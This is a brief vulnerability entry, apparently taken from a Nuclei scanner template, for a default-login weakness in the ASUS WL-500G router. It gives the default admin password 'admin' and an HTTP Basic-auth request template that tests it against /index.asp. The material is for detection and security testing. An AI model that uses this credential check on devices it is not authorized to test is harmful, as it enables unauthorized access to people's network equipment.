# Vulnerability: ASUS WL-500G - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`asus-wl500g-default-login.yaml`)

## Description
ASUS WL-500 contains a default login vulnerability. Default admin login password 'admin' was found.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index.asp HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

